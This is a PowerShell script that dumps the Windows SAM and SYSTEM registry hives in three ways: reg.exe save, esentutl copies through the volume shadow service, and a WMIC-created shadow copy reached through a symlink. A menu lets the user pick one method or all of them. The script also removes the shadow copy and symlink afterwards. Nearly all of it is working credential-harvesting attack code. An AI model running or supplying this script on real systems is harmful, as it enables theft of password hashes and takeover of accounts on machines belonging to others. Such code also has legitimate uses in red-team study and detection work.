function regSave {
    reg.exe save hklm\system SYSTEM /y
    reg.exe save hklm\sam SAM /y    
}

function hiveEsent{ # Esentutl(Extensible Storage Engine Utilities) -> repair database or more
    $samFilePath = Join-Path -Path $env:TEMP -ChildPath SAM
    $systemFilePath = Join-Path -Path $env:TEMP -ChildPath SYSTEM
    
    # file already exist -> delete sam,system 
    if(Test-Path $samFilePath){Remove-Item $samFilePath}
    if(Test-Path $systemFilePath){Remove-Item $systemFilePath}

    # dump
    esentutl.exe /y /vss C:\Windows\System32\config\SAM /d $samFilePath
    esentutl.exe /y /vss C:\Windows\System32\config\SYSTEM /d $systemFilePath

    # check
    Get-ChildItem -Path $samFilePath
    Get-ChildItem -Path $systemFilePath
}

function wmicShadow{

  try {
    $executeWmic = wmic shadowcopy call create Volume='C:\' #s(Get-WmiObject -list win32_shadowcopy).create("C:\","ClientAccessible")
    [string]$executeWmic -match 'ShadowID = "{(.+?)}"' > $Null; $shadowID = $Matches[1]
    $vssList = vssadmin list shadows  
    
    $lines = $vssList -split "`r`n"
    $i = 0 
    foreach ($line in $lines) {
      if ($line -match $shadowID) {
        $shadowVolume = ($lines[$($i+2)] -split ": ")[1]
        Write-Host $shadowVolume
        $shadowLink = Join-Path -Path $ENV:SystemDrive -ChildPath shadowcopy
        
        Invoke-Expression -Command "cmd /c mklink /d '$shadowLink' '$shadowVolume'" # make symlink 
        
        # robocopy /b $shadowLink\Windows\System32\config .\ SAM
        Copy-Item $shadowLink\Windows\System32\config\SAM wmicSAM
        break
      }
      $i++
    }  
  }
  finally {
    vssadmin delete shadows /for=c: /oldest /quiet #remove shadowcopy
    Invoke-Expression -Command "cmd /c rmdir /S /Q '$shadowLink'"; #remove symlink 
  }
}


$mode = [int]::Parse((Read-Host "Select a mode by number`n[0]:all`n[1]:reg-save`n[2]:esentutl-vss`n[3]:wmic-vss`n"));

switch($mode){
  0 {regSave;Start-Sleep -Seconds 2;hiveEsent;Start-Sleep -Seconds 2;wmicShadow;}
  1 {regSave;}
  2 {hiveEsent;}
  3 {wmicShadow;}
  Default{Write-Error "Selection Error"}
}

